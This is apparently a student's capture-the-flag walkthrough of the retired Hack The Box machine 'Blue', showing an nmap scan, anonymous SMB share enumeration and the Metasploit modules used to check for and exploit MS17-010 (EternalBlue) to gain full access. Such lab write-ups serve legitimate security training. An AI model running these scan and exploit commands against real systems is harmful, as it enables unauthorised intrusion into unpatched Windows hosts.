Type: #windows  
Level: #easy 
Link: <https://app.hackthebox.eu/machines/Blue>
Tags : #TCM 
Tools: [[NMAP]] [[]] [[]]	

## Pentesting of retired HTB VM Blue
### Following walkthrougt of TCM on udemy

Info on the VM : Windows with IP 10.10.10.40

First let's do a classic nmap scan  
`sudo nmap -A -T4 -p- 10.10.10.40`

NMAP Result : 
```
Nmap scan report for 10.10.10.40
Host is up (0.038s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/18%OT=135%CT=1%CU=35115%PV=Y%DS=2%DC=T%G=Y%TM=607C3D
OS:DE%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M
OS:54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -18m31s, deviation: 34m37s, median: 1m27s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-18T15:11:58+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-18T14:11:59
|_  start_date: 2021-04-18T13:47:27

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   38.15 ms 10.10.14.1
2   38.13 ms 10.10.10.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.90 seconds
```

FIrst enumeration :

Open ports : `135 139 445`

So we're looking at a potential SMB vulnerability but since the OS is old we might end up using another W7 vuln like EternalBlue.

Let's run an SMB client to see if we can access something :

```
smbclient -N -L \\\\10.10.10.40\\    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

ADMIN C and IPC are password restricted :

```
smbclient \\\\10.10.10.40\\ADMIN   
Enter WORKGROUP\root's password: 
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
```

Share and Users are accessible whiout password but does not seems to have any file of interest.

Using metasploit I got the SMB Version :

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.40
run
```

`10.10.10.40:445       - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:35m 52s) (guid:{0ca2099d-2d7f-4d2e-b604-b9503d0c10d8}) (authentication domain:HARIS-PC)
`

But exploiting SMB when EternalBlue is present is pointless so :
```
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.10.10.40
exploit

```

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
exploit

```

From here I got full access to the VM and I just got the flags in C:/Administrator/Desktop/root.txt and C:/haris/Desktop/user.txt

#pwned 